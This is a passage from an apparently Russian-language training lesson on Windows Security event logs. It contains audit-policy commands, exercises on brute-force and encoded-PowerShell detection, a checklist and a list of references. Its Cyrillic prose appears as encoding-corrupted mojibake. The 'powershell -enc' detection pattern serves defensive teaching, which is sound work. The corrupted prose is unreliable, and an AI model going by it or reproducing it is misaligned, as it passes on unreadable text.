# –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Ç–µ–∫—É—â–∏–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –∞—É–¥–∏—Ç–∞
auditpol /get /category:*

# –í–∫–ª—é—á–∏—Ç—å –∞—É–¥–∏—Ç —Å–æ–∑–¥–∞–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ (–¥–ª—è 4688)
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable

# –í–∫–ª—é—á–∏—Ç—å –∫–æ–º–∞–Ω–¥–Ω—É—é —Å—Ç—Ä–æ–∫—É –≤ 4688 (—á–µ—Ä–µ–∑ —Ä–µ–µ—Å—Ç—Ä)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" `
    /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
```

---

## üõ†Ô∏è –ó–∞–¥–∞–Ω–∏—è

### –ó–∞–¥–∞–Ω–∏–µ 1 ‚≠ê ‚Äî –¢–∞–±–ª–∏—Ü–∞ Event ID

–ë–µ–∑ –ø–æ–¥—Å–∫–∞–∑–æ–∫ –∑–∞–ø–æ–ª–Ω–∏—Ç–µ —Ç–∞–±–ª–∏—Ü—É –ø–æ –ø–∞–º—è—Ç–∏:

| Event ID | –û–ø–∏—Å–∞–Ω–∏–µ | –ö–∞–Ω–∞–ª | –ö–æ–≥–¥–∞ –º–æ–Ω–∏—Ç–æ—Ä–∏—Ç—å |
|----------|----------|-------|-----------------|
| 4624 | ? | ? | ? |
| 4625 | ? | ? | ? |
| 4648 | ? | ? | ? |
| 4672 | ? | ? | ? |
| 4688 | ? | ? | ? |
| 4698 | ? | ? | ? |
| 4720 | ? | ? | ? |
| 4732 | ? | ? | ? |
| 4740 | ? | ? | ? |
| 7045 | ? | ? | ? |

---

### –ó–∞–¥–∞–Ω–∏–µ 2 ‚≠ê‚≠ê ‚Äî –ê–Ω–∞–ª–∏–∑ –ª–æ–≥–æ–≤

–°–∫–∞—á–∞–π—Ç–µ –æ–±—Ä–∞–∑–µ—Ü –∂—É—Ä–Ω–∞–ª–∞ (–∏–ª–∏ —Å–æ–∑–¥–∞–π—Ç–µ —Ç–µ—Å—Ç–æ–≤—É—é —Å—Ä–µ–¥—É). –ò—Å–ø–æ–ª—å–∑—É—è PowerShell –∏–ª–∏ Event Viewer:

1. –ù–∞–π–¥–∏—Ç–µ –≤—Å–µ —Å–æ–±—ã—Ç–∏—è 4625 –∑–∞ –ø–æ—Å–ª–µ–¥–Ω–∏–µ 7 –¥–Ω–µ–π
2. –û–ø—Ä–µ–¥–µ–ª–∏—Ç–µ, –µ—Å—Ç—å –ª–∏ –ø—Ä–∏–∑–Ω–∞–∫–∏ –±—Ä—É—Ç—Ñ–æ—Ä—Å–∞ (–±–æ–ª–µ–µ 5 –ø–æ–ø—ã—Ç–æ–∫ —Å –æ–¥–Ω–æ–≥–æ IP –∑–∞ 5 –º–∏–Ω—É—Ç)
3. –ù–∞–π–¥–∏—Ç–µ –≤—Å–µ —Å–æ–±—ã—Ç–∏—è 4688, –≥–¥–µ `CommandLine` —Å–æ–¥–µ—Ä–∂–∏—Ç `powershell` –∏ `-enc`
4. –ù–∞–π–¥–∏—Ç–µ –≤—Å–µ —Å–æ–±—ã—Ç–∏—è 4732 (–¥–æ–±–∞–≤–ª–µ–Ω–∏–µ –≤ –≥—Ä—É–ø–ø—ã)
5. –°–æ—Å—Ç–∞–≤—å—Ç–µ –∫—Ä–∞—Ç–∫–∏–π –æ—Ç—á—ë—Ç: —á—Ç–æ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–æ, —á—Ç–æ —Ç—Ä–µ–±—É–µ—Ç —Ä–∞—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏—è

---

### –ó–∞–¥–∞–Ω–∏–µ 3 ‚≠ê‚≠ê‚≠ê ‚Äî –°–∫—Ä–∏–ø—Ç –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –±—Ä—É—Ç—Ñ–æ—Ä—Å–∞

–ù–∞–ø–∏—à–∏—Ç–µ PowerShell-—Å–∫—Ä–∏–ø—Ç, –∫–æ—Ç–æ—Ä—ã–π:

1. –ß–∏—Ç–∞–µ—Ç Security-–ª–æ–≥ –∑–∞ –ø–æ—Å–ª–µ–¥–Ω–∏–µ N —á–∞—Å–æ–≤ (–∞—Ä–≥—É–º–µ–Ω—Ç)
2. –ò–∑–≤–ª–µ–∫–∞–µ—Ç –≤—Å–µ —Å–æ–±—ã—Ç–∏—è 4625
3. –ì—Ä—É–ø–ø–∏—Ä—É–µ—Ç –ø–æ `IpAddress`
4. –í—ã–≤–æ–¥–∏—Ç –∞–ª–µ—Ä—Ç, –µ—Å–ª–∏ —Å –æ–¥–Ω–æ–≥–æ IP –±–æ–ª–µ–µ `threshold` –ø–æ–ø—ã—Ç–æ–∫ (–∞—Ä–≥—É–º–µ–Ω—Ç, –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é 10)
5. –î–ª—è –∫–∞–∂–¥–æ–≥–æ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ–≥–æ IP –≤—ã–≤–æ–¥–∏—Ç:
   - –°–ø–∏—Å–æ–∫ —Ü–µ–ª–µ–≤—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
   - –í—Ä–µ–º–µ–Ω–Ω–æ–π –¥–∏–∞–ø–∞–∑–æ–Ω –∞—Ç–∞–∫–∏
   - –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ø—ã—Ç–æ–∫
6. –†–µ–∑—É–ª—å—Ç–∞—Ç —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –≤ CSV-—Ñ–∞–π–ª

```powershell
# –®–∞–±–ª–æ–Ω –¥–ª—è –Ω–∞—á–∞–ª–∞:
param(
    [int]$Hours = 24,
    [int]$Threshold = 10,
    [string]$OutputPath = ".\bruteforce_report.csv"
)
# –í–∞—à –∫–æ–¥ –∑–¥–µ—Å—å...
```

---

## ‚úÖ –ß–µ–∫–ª–∏—Å—Ç –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏

- [ ] –Ø –∑–Ω–∞—é 4 –æ—Å–Ω–æ–≤–Ω—ã—Ö –∫–∞–Ω–∞–ª–∞ Windows Event Log –∏ —á—Ç–æ –≤ –∫–∞–∂–¥–æ–º —Ö—Ä–∞–Ω–∏—Ç—Å—è
- [ ] –Ø –º–æ–≥—É –æ—Ç–∫—Ä—ã—Ç—å Event Viewer –∏ –ø—Ä–∏–º–µ–Ω–∏—Ç—å —Ñ–∏–ª—å—Ç—Ä –ø–æ EventID –∏ –≤—Ä–µ–º–µ–Ω–∏
- [ ] –Ø –∑–Ω–∞—é –Ω–∞–∏–∑—É—Å—Ç—å Event ID 4624, 4625, 4648, 4672, 4688, 4698, 4720, 4732, 4740, 7045
- [ ] –Ø –ø–æ–Ω–∏–º–∞—é —Ä–∞–∑–Ω–∏—Ü—É –º–µ–∂–¥—É Logon Type 2, 3, 4, 5, 7, 10
- [ ] –Ø –º–æ–≥—É –ø–æ SubStatus –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –ø—Ä–∏—á–∏–Ω—É –Ω–µ—É–¥–∞—á–Ω–æ–≥–æ –≤—Ö–æ–¥–∞ (4625)
- [ ] –Ø —É–º–µ—é —á–∏—Ç–∞—Ç—å –ø–æ–ª—è —Å–æ–±—ã—Ç–∏—è 4688: NewProcessName, ParentProcessName, CommandLine
- [ ] –Ø –∑–Ω–∞—é, —á—Ç–æ —Ç–∞–∫–æ–µ Sysmon –∏ –∫–∞–∫–∏–µ Event ID –æ–Ω –¥–æ–±–∞–≤–ª—è–µ—Ç
- [ ] –Ø –ø–æ–Ω–∏–º–∞—é, —á—Ç–æ —Ç–∞–∫–æ–µ Script Block Logging –∏ Event ID 4104
- [ ] –Ø —É–º–µ—é —Ä–∞—Å–ø–æ–∑–Ω–∞—Ç—å –ø–∞—Ç—Ç–µ—Ä–Ω –±—Ä—É—Ç—Ñ–æ—Ä—Å–∞ –≤ –ª–æ–≥–∞—Ö
- [ ] –Ø —É–º–µ—é —Ä–∞—Å–ø–æ–∑–Ω–∞—Ç—å –ø–∞—Ç—Ç–µ—Ä–Ω lateral movement (—Ü–µ–ø–æ—á–∫—É 4624 Type=3 –Ω–∞ —Ä–∞–∑–Ω—ã—Ö –º–∞—à–∏–Ω–∞—Ö)
- [ ] –Ø —É–º–µ—é –Ω–∞–ø–∏—Å–∞—Ç—å –ø—Ä–æ—Å—Ç–æ–π PowerShell-–∑–∞–ø—Ä–æ—Å –¥–ª—è –≤—ã–±–æ—Ä–∫–∏ —Å–æ–±—ã—Ç–∏–π

---

## üîó –†–µ—Å—É—Ä—Å—ã

- [Ultimate Windows Security ‚Äî Event ID Encyclopedia](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/) ‚Äî –ª—É—á—à–∏–π —Å–ø—Ä–∞–≤–æ—á–Ω–∏–∫ –ø–æ Event ID
- [Microsoft Docs ‚Äî Windows Security Event Log](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/security-auditing-overview)
- [SANS Poster: Windows Logging Cheat Sheet](https://www.sans.org/posters/windows-logging-cheat-sheet/) ‚Äî —Ä–∞—Å–ø–µ—á–∞—Ç–∞—Ç—å –∏ –ø–æ–≤–µ—Å–∏—Ç—å —Ä—è–¥–æ–º —Å –º–æ–Ω–∏—Ç–æ—Ä–æ–º
- [Malware Archaeology ‚Äî Windows Logging Cheat Sheets](https://www.malwarearchaeology.com/cheat-sheets)
- [SwiftOnSecurity Sysmon Config](https://github.com/SwiftOnSecurity/sysmon-config) ‚Äî –≥–æ—Ç–æ–≤–∞—è –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è Sysmon
- [NSA Event Forwarding Guidance](https://github.com/nsacyber/Event-Forwarding-Guidance) ‚Äî –∫–∞–∫–∏–µ —Å–æ–±—ã—Ç–∏—è –ø–µ—Ä–µ—Å—ã–ª–∞—Ç—å –≤ SIEM
- [Sigma Rules](https://github.com/SigmaHQ/sigma) ‚Äî –≥–æ—Ç–æ–≤—ã–µ –ø—Ä–∞–≤–∏–ª–∞ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –ø–æ Event ID
